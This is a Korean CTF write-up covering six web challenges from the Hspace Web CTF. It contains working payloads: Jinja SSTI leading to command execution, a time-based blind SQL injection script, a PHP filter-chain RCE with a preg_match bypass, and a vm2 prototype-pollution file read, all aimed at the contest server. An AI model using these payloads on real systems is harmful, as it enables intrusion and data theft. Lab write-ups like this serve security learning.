# Hspace Web CTF

## 대회 일정
**2024-01-13 10:00 ~ 20:00**

## 대회 결과   
<img src="images/Top10-Users.png">      
      
<img src="images/result.JPG">      
      
## 후기    
            
NodeJS vm2 sandbox 취약점을 활용하여 RCE하는 sandbox 문제를 풀지 못한채로 끝나버려서 아쉬움이 남는 대회였다... (야간 근무를 가야했기에 ...)    

## 1. for_beginner    

SSTI 취약점을 활용해 RCE 하는 문제였다.   
    
```python
@app.route('/')
def main():
    name = request.args.get("name", "World")
    return render_template_string(f'Hello {name}!!')
```    

Flask에서 랜더링 함수인 `render_template_string()`에서 `SSTI` 취약점이 발생한다.     
    
```python
blacklist = ['os','subprocesses','exec','vars','sys','"','\+',
             'open','rm','main','static','templates','ctf','rf',
             'spawnlp','execfile','dir','dev','tcp','sh','import',
             'built','__class__','for','request','\,','app','file',
             'url_for','\[','\]','config']

def Prevent_SSTI(input):
    for i in blacklist:
        res = re.search(i,input)
        if res:
            return True
    else:
        return False
```

키워드 위주로 필터링이 걸려있어 이를 우회해주면 된다. 

## Exploit Code
```python
http://3.34.190.217:1337/?name={{request[%22__%22+%22class%22+%22__%22].mro()[3].__subclasses__()[494](%27cat%20flag.txt%27,shell=True,stdout=-1).communicate()}}
```

### FLAG   
hspace{57a32c35915278d4de4ca21a8dc22b7f642a2a33e1508050c9498e1e48290e38}

## 2. for_beginner-SQL 
   
Blind SQL Injection을 사용하여 관리자 패스워드를 알아내는 문제였다. 

```php
<?php
session_start();
require_once "config/dbconn.php";

$userid = $_GET['userid'];
$password = $_GET['password'];

if(isset($userid) && isset($password)) {
    $query = "SELECT userid, password FROM user WHERE userid = '${userid}' and password = '".md5($password)."'";
    try {
        $result = $mysqli->query($query);
        $data = mysqli_fetch_array($result);
        if(isset($data) && $data[0] == "admin" && $data[1] === md5($password)){
            die($flag);
	    } else {
		    die("Wrong...");
	    }
    } catch(Exception $e) {
    }
} else {
    show_source(__FILE__);
}
?>
```
PHP에서 SQL Injection 취약점이 존재하는 함수인 `$mysqli->query($query);`를 사용하고 있다. 패스워드는 md5 해쉬 알고리즘을 사용하고 있어 userid를 통해 Blind SQL Injection을 수행하였다.    
    

## Exploit Code    
```python
import requests
import time

url = "http://3.34.190.217:2023/"
password = ""
length_password = 0
for i in range(64): 
    start = time.time() 
    r = requests.get(
                url, 
                params={
                    "userid": "aaaa' or if(length(password)={},sleep(3),false)#".format(i),
                    "password": "test"
                }
            )
    end = time.time() 
    if end - start >= 1.5: 
        length_password = i 
        print(f"Length of Password: {i}")
        break 
        
for i in range(1, length_password + 1):
    for j in range(32, 128):
        start = time.time()
        r = requests.get(
                url, 
                params={
                    "userid": "aaaa' or if(ascii(substr(password,{},1))={},sleep(3),false)#".format(i, j),
                    "password": "test"
                }
            )
        end = time.time()
        if end - start >= 1.5: 
            password += chr(j) 
            print(password)

print("Admin MD5 Password:", password) 
```     

```
Length of Password: 32
e
ed
edg
edge
edge6
edge6b
edge6b5
edge6b50
edge6b50S
edge6b50Se
edge6b50Se7
edge6b50Se7b
edge6b50Se7b5
edge6b50Se7b58
edge6b50Se7b582
edge6b50Se7b5826
edge6b50Se7b5826f
edge6b50Se7b5826fe
edge6b50Se7b5826fe4
edge6b50Se7b5826fe48
edge6b50Se7b5826fe48f
edge6b50Se7b5826fe48fc
edge6b50Se7b5826fe48fc1
edge6b50Se7b5826fe48fc1f
edge6b50Se7b5826fe48fc1f0
edge6b50Se7b5826fe48fc1f0f
edge6b50Se7b5826fe48fc1f0fe
edge6b50Se7b5826fe48fc1f0fe7
edge6b50Se7b5826fe48fc1f0fe77
edge6b50Se7b5826fe48fc1f0fe772
edge6b50Se7b5826fe48fc1f0fe772c
edge6b50Se7b5826fe48fc1f0fe772c4
edge6b50Se7b5826fe48fc1f0fe772c48
edge6b50Se7b5826fe48fc1f0fe772c48f
Admin MD5 Password: edge6b50Se7b5826fe48fc1f0fe772c48f
```

MD5 Decrypt: https://10015.io/tools/md5-encrypt-decrypt    
관리자의 MD5 패스워드를 알아내고 위 링크에 접속하여 복호화를 수행한 다음 `http://3.34.190.217:2023/?userid=admin&password=1q2w3e4r5t6y` 관리자 계정으로 로그인해주면 FLAG를 획득할 수 있다.     
          
### FLAG   
hspace{12cb8da4edbe2a3cba650182b86570772005aef5b3840fef41e46ad8}    
     

## Magic eye      
    
페이지에 접속하면 `Your starting point: h` 표시가 있고 클릭 시 `http://3.34.190.217:24915/h/`경로로 이동하고 `Not Found` 문구가 뜬다. 하지만, 200으로 응답이 오는 것을 확인했다. 

이외에 단서는 존재하지 않아 gobuster로 디렉터리 경로를 확인해보니  `http://3.34.190.217:24915/h/s/p/a/c/e`경로까지 접근이 가능했다.    
     
더이상 경로가 확인되지 않다가 경로 자체가 FLAG 라는 생각이 들어 `{` 문자를 추가해보니 200으로 응답되는 것을 확인했다.     

```
http://3.34.190.217:24915/h/s/p/a/c/e/{/
http://3.34.190.217:24915/h/s/p/a/c/e/{/5/
http://3.34.190.217:24915/h/s/p/a/c/e/{/5/a/
http://3.34.190.217:24915/h/s/p/a/c/e/{/5/a/f/
http://3.34.190.217:24915/h/s/p/a/c/e/{/5/a/f/c/
http://3.34.190.217:24915/h/s/p/a/c/e/{/5/a/f/c/f/
http://3.34.190.217:24915/h/s/p/a/c/e/{/5/a/f/c/f/1/
http://3.34.190.217:24915/h/s/p/a/c/e/{/5/a/f/c/f/1/d/
http://3.34.190.217:24915/h/s/p/a/c/e/{/5/a/f/c/f/1/d/e/
http://3.34.190.217:24915/h/s/p/a/c/e/{/5/a/f/c/f/1/d/e/4/
http://3.34.190.217:24915/h/s/p/a/c/e/{/5/a/f/c/f/1/d/e/4/5/
http://3.34.190.217:24915/h/s/p/a/c/e/{/5/a/f/c/f/1/d/e/4/5/c/
http://3.34.190.217:24915/h/s/p/a/c/e/{/5/a/f/c/f/1/d/e/4/5/c/1/
http://3.34.190.217:24915/h/s/p/a/c/e/{/5/a/f/c/f/1/d/e/4/5/c/1/2/
http://3.34.190.217:24915/h/s/p/a/c/e/{/5/a/f/c/f/1/d/e/4/5/c/1/2/f/
http://3.34.190.217:24915/h/s/p/a/c/e/{/5/a/f/c/f/1/d/e/4/5/c/1/2/f/5/
http://3.34.190.217:24915/h/s/p/a/c/e/{/5/a/f/c/f/1/d/e/4/5/c/1/2/f/5/8/
http://3.34.190.217:24915/h/s/p/a/c/e/{/5/a/f/c/f/1/d/e/4/5/c/1/2/f/5/8/d/
http://3.34.190.217:24915/h/s/p/a/c/e/{/5/a/f/c/f/1/d/e/4/5/c/1/2/f/5/8/d/d/
http://3.34.190.217:24915/h/s/p/a/c/e/{/5/a/f/c/f/1/d/e/4/5/c/1/2/f/5/8/d/d/0/
http://3.34.190.217:24915/h/s/p/a/c/e/{/5/a/f/c/f/1/d/e/4/5/c/1/2/f/5/8/d/d/0/c/
http://3.34.190.217:24915/h/s/p/a/c/e/{/5/a/f/c/f/1/d/e/4/5/c/1/2/f/5/8/d/d/0/c/f/
http://3.34.190.217:24915/h/s/p/a/c/e/{/5/a/f/c/f/1/d/e/4/5/c/1/2/f/5/8/d/d/0/c/f/b/
http://3.34.190.217:24915/h/s/p/a/c/e/{/5/a/f/c/f/1/d/e/4/5/c/1/2/f/5/8/d/d/0/c/f/b/2/
http://3.34.190.217:24915/h/s/p/a/c/e/{/5/a/f/c/f/1/d/e/4/5/c/1/2/f/5/8/d/d/0/c/f/b/2/c/
http://3.34.190.217:24915/h/s/p/a/c/e/{/5/a/f/c/f/1/d/e/4/5/c/1/2/f/5/8/d/d/0/c/f/b/2/c/f/
http://3.34.190.217:24915/h/s/p/a/c/e/{/5/a/f/c/f/1/d/e/4/5/c/1/2/f/5/8/d/d/0/c/f/b/2/c/f/d/
http://3.34.190.217:24915/h/s/p/a/c/e/{/5/a/f/c/f/1/d/e/4/5/c/1/2/f/5/8/d/d/0/c/f/b/2/c/f/d/f/
http://3.34.190.217:24915/h/s/p/a/c/e/{/5/a/f/c/f/1/d/e/4/5/c/1/2/f/5/8/d/d/0/c/f/b/2/c/f/d/f/a/
http://3.34.190.217:24915/h/s/p/a/c/e/{/5/a/f/c/f/1/d/e/4/5/c/1/2/f/5/8/d/d/0/c/f/b/2/c/f/d/f/a/2/
http://3.34.190.217:24915/h/s/p/a/c/e/{/5/a/f/c/f/1/d/e/4/5/c/1/2/f/5/8/d/d/0/c/f/b/2/c/f/d/f/a/2/2/
http://3.34.190.217:24915/h/s/p/a/c/e/{/5/a/f/c/f/1/d/e/4/5/c/1/2/f/5/8/d/d/0/c/f/b/2/c/f/d/f/a/2/2/e/
http://3.34.190.217:24915/h/s/p/a/c/e/{/5/a/f/c/f/1/d/e/4/5/c/1/2/f/5/8/d/d/0/c/f/b/2/c/f/d/f/a/2/2/e/6/
```
익스 코드를 작성하고 돌려보니 이와 같이 결과가 나왔고, `/`를 삭제하고 FLAG로 제출해봤는데 틀렸다고 나왔다. 그래서, `http://3.34.190.217:24915/h/s/p/a/c/e/{/5/a/f/c/f/1/d/e/4/5/c/1/2/f/5/8/d/d/0/c/f/b/2/c/f/d/f/a/2/2/e/6/` 경로에 접근해보니 `Wow, the final flag is (what_you_got) + _cab2038942053898e0e6486cebfd368a}` 문구가 존재했다.    

즉, 앞뒤로 플래그를 합쳐주면 된다.         

## Exploit Code     

```python 
import requests 
url = "http://3.34.190.217:24915"

real_url = f"{url}/h/s/p/a/c/e/"
for i in range(50): 
    for j in range(32, 128):
        c = chr(j)
        r= requests.get(real_url + c)
        if c in ["#", ".", "?"]: 
            continue 
        if r.status_code == 200:
            real_url += (c + "/")
            print(real_url)
```

### FLAG    
hspace{5afcf1de45c12f58dd0cfb2cfdfa22e6_cab2038942053898e0e6486cebfd368a}      

## web101    
     
이 문제도 앞과 유사하게 gobuster를 활용하여 파일들에 접근하여 FLAG 단서들을 찾는 문제였다. 

## Exploit Code
     
```txt
# /
# Part 1 
# hspace{D0

# /.git
# Part 2
# Acutally, it's not git repository.
# But the flag part2 is : n7_uuuuuu

# /flag.txt
# Part 3
# Wow, you tried flag.txt
# great :)
# Flag part 4 : rBu573r_i 

# /.index.php.swp
# Part 4
# Haha you find it.
# Also, it's not real swap file
# Here is your 3rd part of flag
# uuse_D1

# /admin
# Part 5
# n_R34lCTF_PL

# /robots.txt
# Part 6
# User-agent: *
# Allow: *
# Okay, the flag part6 is LLLLlllzzzz}
# Congratulations!

```     

### FLAG
hspace{D0n7_uuuuuuuuse_D1rBu573r_in_R34lCTF_PLLLLLlllzzzz}     
     
## Multiline-PHP-challenge 

LFI 취약점과 `php://filter`를 활용하여 `webshell`을 업로드하는 문제이다. 
     
```php 
<?php

include "config.php";

$page = $_GET["p"];
if (!$page) {
    $page = "hello";
}

if($page[0] === '/' || preg_match("/^.*(\\.\\.|php).*$/i", $page)) {
    die("no hack");
}

include "$page.php";

```
`index.php`에서 `preg_match()` 함수로 필터링이 걸려있고, `include`로 인해 LFI 취약점이 존재한다.    

`info.php`의 `phpinfo()` 내용 중 `allow_url_fopen: On`이 설정되어있어 RFI를 시도했지만, `http://` 입력이 `/` 필터링에 의해 걸려 잘 수행되지 않았다.  
     
그래서, 대회 당시 문제를 해결하지 못했다. 대회가 끝나고 Write-up이 공개되어 풀이를 봤는데 `php://filter`와 `Too long payload` 방법을 활용해서 문제를 푸는 것이었다.         
        
https://www.leavesongs.com/PENETRATION/use-pcre-backtrack-limit-to-bypass-restrict.html#0x02
           
위 링크에서 `pcre.backtrack_limit` 값보다 더 큰 입력을 주면 `preg_match()` 함수의 반환 값이 `0`이 아닌 `false`가 반환된다고 한다.           
        
<img src="images/Multiline PHP challenge/1.JPG">     
      
문제에서 `pcre.backtrack_limit` 값은 1000으로 설정되어있다. 그리고, 위에 `PCRE JIT Target`을 보면 `x86 64bit`으로 되어있다. 즉, 8 X 1000 bytes 보다 큰 입력을 주면 `preg_match()` 함수를 무력화 시킬 수 있다는 것이다.            

https://github.com/synacktiv/php_filter_chain_generator    
       

RCE를 위해 `php://filter`에 대한 payload를 생성해주는 툴을 사용했다. 

```bash
python3 php_filter_chain_generator.py --chain '<?php system("cat config.php") ?>'
```         
     
위 명령을 통해 나온 결과에 `+` 문자를 추가하여 8000 bytes를 넘도록 해주었다. (`cat config.php` 명령을 입력한 이유는 `config.php`에 `flag` 변수가 존재하기 때문이다.)
     
## Exploit Code     
      
```python
import requests, string, sys, itertools
# MD5: 36f4dab9f17485e9efc5a1c4e4cbedfb

url = "http://3.34.190.217:24913"

php_filter = "php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16|convert.iconv.WINDOWS-1258.UTF32LE|convert.iconv.ISIRI3342.ISO-IR-157|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.BIG5.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM891.CSUNICODE|convert.iconv.ISO8859-14.ISO6937|convert.iconv.BIG-FIVE.UCS-4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.BIG5.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L4.UTF32|convert.iconv.CP1250.UCS-2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-4LE.OSF05010001|convert.iconv.IBM912.UTF-16LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.ISO88594.UTF16|convert.iconv.IBM5347.UCS4|convert.iconv.UTF32BE.MS936|convert.iconv.OSF00010004.T.61|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.R9.ISO6937|convert.iconv.OSF00010100.UHC|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.ISO88594.UTF16|convert.iconv.IBM5347.UCS4|convert.iconv.UTF32BE.MS936|convert.iconv.OSF00010004.T.61|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|convert.iconv.MSCP1361.UTF-32LE|convert.iconv.IBM932.UCS-2BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.CP1163.CSA_T500|convert.iconv.UCS-2.MSCP949|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.BIG5HKSCS.UTF16|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1162.UTF32|convert.iconv.L4.T.61|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP949.UTF32BE|convert.iconv.ISO_69372.CSIBM921|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.iconv.UHC.CP1361|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.CSA_T500-1983.UCS-2BE|convert.iconv.MIK.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.iconv.UHC.CP1361|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.iconv.CP950.UTF16|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.863.UNICODE|convert.iconv.ISIRI3342.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.863.UTF-16|convert.iconv.ISO6937.UTF16LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.864.UTF32|convert.iconv.IBM912.NAPLPS|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.BIG5|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|convert.iconv.MSCP1361.UTF-32LE|convert.iconv.IBM932.UCS-2BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.ISO6937.8859_4|convert.iconv.IBM868.UTF-16LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L4.UTF32|convert.iconv.CP1250.UCS-2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF16|convert.iconv.ISO6937.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF32|convert.iconv.L6.UCS-2|convert.iconv.UTF-16LE.T.61-8BIT|convert.iconv.865.UCS-4LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=php://temp"

php_filter += '+' * (8096 - len(php_filter))

print(php_filter)
```      
    
출력된 결과를 `index.php?p=`에 넣어주면 아래와 같이 `FLAG`를 얻을 수 있다.     

<img src="images/Multiline PHP challenge/2.JPG">    

### FLAG     
hspace{5525f4bd51f0c29ac4f7f762813af852}     
      
## sandbox     

전역 변수로 선언된 `var lastUid = 0` 변수는 유저가 한 명씩 생성될 때마다 값이 1씩 증가한다.   
                
`users.add({ username: "admin", password: hashPasswd(rand()), uid: lastUid++ })` 코드로 인해 새로운 유저가 부여받는 `lastUid` 은 1이상의 값을 갖는다.    
           
```javascript
app.use((req,res,next) => {
	req.userUid = -1
	req.userData = ""

	let data = req.cookies.data
	let uid = req.cookies.uid
	let passwd = req.cookies.passwd

	if(uid == undefined || passwd == undefined)
		return next()

	let found = false
	for(let e of users.entries())
		if(e[0].uid == uid && e[0].password == passwd)
			found = true

	if(found){
		req.userUid = uid
		req.userData = data
	}

	next()
})  
```     
`/login` 경로에 요청을 보내게 되면 위 로직 또한 실행이 되는데 `uid` 값이 회원가입 시 할당된 `uid` 값과 동일한지 확인하는 로직이 포함되어있다.    
          
```javascript
app.get('/checkout',(req,res) => {
    ...  
	if(parseInt(req.userUid) != 0)
		return res.json({ error: true, msg: "You can't do this sorry" })
    ...
})
```     
     
하지만, `/checkout` 경로에 접근하기 위해서는 `parseInt(req.userUid)` 값이 0을 만족해야한다.    
       
`admin` 계정을 알아낼 방법은 없기에 `e[0].uid == uid && e[0].password == passwd`과 `parseInt(req.userUid) != 0` 조건문은 둘 다 만족하는 `userUid` 값으로 설정해주면 된다.     
     
예를 들어, 유저 `userUid` 값이 3이라고 할 때, 2진수 형태인 `0b11` 값을 넣어주면 두 조건을 만족시킬 수 있다.     
         
그 이유는 `parseInt()`에서 `0b11` 값을 2진수로 인식하지 않고 `0` 이후에 나오는 문자는 단순 문자열로 인식하기 때문이다.         
       
다음으로, `/checkout` 경로에서 vm2 모듈을 활용하여 exploit을 해야한다.   
     
```javascript
app.get('/checkout',(req,res) => {
	if(req.userUid == -1 || !req.userData)
		return res.json({ error: true, msg: "Login first" })

	if(parseInt(req.userUid) != 0)
		return res.json({ error: true, msg: "You can't do this sorry" })

	if(req.userData.length > 160)
		return res.json({ error: true, msg: "Too long!!" })

	if(checkoutTimes.has(req.ip) && checkoutTimes.get(req.ip)+1 > now()) {
		return res.json({ error: true, msg: 'too fast'})
	}
	checkoutTimes.set(req.ip,now())
	
	let sbx = {
		readFile: (path) => {
			if(!(new String(path).toString()).includes('flag'))
				return fs.readFileSync(path,{encoding: "utf-8"})
			return null
		},
		sum: (args) => args.reduce((a,b)=>a+b),
	}

	let vm = new vm2.VM({
		timeout: 20,
	    sandbox: sbx,
	    fixAsync: true,
	    eval: false
	})

	let result = ":(";
	try {
		result = new String(vm.run(`sum([${req.userData}])`))
	} catch (e) {}
	res.type('text/plain').send(result)
})
```            

`package.json`을 보면, `vm2: ^3.9.9` 버전이라고 나와있어 이후 버전에서 발생한 poc 코드를 찾아보았다.     

https://security.snyk.io/package/npm/vm2     

`3.9.14` 버전에서 터지는 sandbox escape 취약점을 활용하여 RCE를 시도했다.    
      
```javascript
if(req.userData.length > 160)
	return res.json({ error: true, msg: "Too long!!" })
```     
           
poc 코드를 실행하고 나서 코드 길이에 조건이 걸려있다는 것을 알게 되었고 기존 poc에서 다른 gadget을 찾아 RCE 하는 문제라고 생각하여 대회 당시 계속 코드 길이를 줄이는 방법을 시도했었다...   

```javascript
let sbx = {
	readFile: (path) => {
		if(!(new String(path).toString()).includes('flag'))
			return fs.readFileSync(path,{encoding: "utf-8"})
		return null
	},
	sum: (args) => args.reduce((a,b)=>a+b),
}
```            
대회가 끝나고 나서야 `fs.readFileSync()` 함수 내에 속성 값들을 Prototype Pollution 취약점으로 변조하여 문제를 해결할 수 있겠다는 생각이 들었다.       
          
<img src="images/sandbox/1.png">              
https://github.com/nodejs/node/blob/main/lib/fs.js#L448     
           
옵션으로 `utf-8`을 사용하고 있고, `path` 값이 `int` 가 아니므로 `getValidatePath()` 함수를 호출하게 된다.        

<img src="images/sandbox/2.png">     
https://github.com/nodejs/node/blob/main/lib/fs.js#L108C3-L108C19       
        
`getValidatePath()` 함수는 `internal/fs/utils` 에 정의되어있어 해당 경로에 가보았다.     
        
<img src="images/sandbox/3.png">     
https://github.com/nodejs/node/blob/main/lib/internal/fs/utils.js#L762C7-L762C24       
             
`getValidatePath()` 함수는 `toPathIfFileURL()` 함수를 호출하여 `path` 값을 받아온다.      
             
<img src="images/sandbox/4.png">    
https://github.com/nodejs/node/blob/main/lib/internal/url.js#L1495      
       
`toPathIfFileURL()` 함수에서 `isURL()` 함수를 통해 `URL` 여부를 판단한다.     

<img src="images/sandbox/5.png">    
https://github.com/nodejs/node/blob/main/lib/internal/url.js#L765
       
`href`, `protocol` 값이 존재하고 `auth`, `path` 가 `undefined` 인 경우 `True`가 된다. 만일 그렇지 않은 경우, `fileURLToPath()` 함수를 호출하게 된다.    
       
<img src="images/sandbox/6.png">     
https://github.com/nodejs/node/blob/main/lib/internal/url.js#L1403
           
`fileURLToPath()` 함수에서 `path.protocol` 값이 `file:` 이고 윈도우가 아닐 경우 `getPathFromURLPosix()` 함수를 호출한다. `/flag.txt` 파일을 읽어줘야 하기 때문에 `file:` 를 사용하는 방향을 선택했다.      
           
<img src="images/sandbox/7.png">          
https://github.com/nodejs/node/blob/main/lib/internal/url.js#L1385
                      
`getPathFromURLPosix()` 함수에서 `hostname`이 `''` 임을 만족해주고 `pathname` 값으로 `/flag.txt` 를 넣어주면 파일을 읽을 수 있게 된다.           
                 
즉, `href`, `protocol` 값 존재 / `auth`, `path` === `undefined` / `hostname`값이  `''`이고 `pathname`이 `/app/flag`가 되도록 Prototype Pollution 취약점을 통해 변조해주면 된다.            
                        
`{ href: 'a', protocol: 'file:', hostname: '', pathname: '/flag.txt' }` 로 설정해주었다.     
          
## Exploit Code             
      
```python
import requests, json
url = "http://3.34.190.217:24916"
# url = "http://localhost:24916"
# hspace{0eabbdb7a226290c9f5a6eae6d72d6c1}

s = requests.session() 
r = requests.post(
        f"{url}/register",
        json={
            "username": "guest",
            "password": "guest"
        })
print(r.text)

r = s.post(
        f"{url}/login",
        json={
            "username": "guest",
            "password": "guest"
        })
cookies = r.cookies.get_dict()
passwd, uid = cookies["passwd"], cookies["uid"]
print(r.text)
print(cookies)

cookies["uid"] = "0b11"
cookies["data"] = """1+1])%3Ba={}%3Ba.__proto__.href='a'%3Ba.__proto__.protocol="file:"%3Ba.__proto__.hostname=""%3Ba.__proto__.pathname="/flag.txt"%3BreadFile({})%3b//"""
r = requests.get(
        f"{url}/checkout",
        cookies=cookies)
print(r.text)
```
      
 ### FLAG
 hspace{0eabbdb7a226290c9f5a6eae6d72d6c1}     

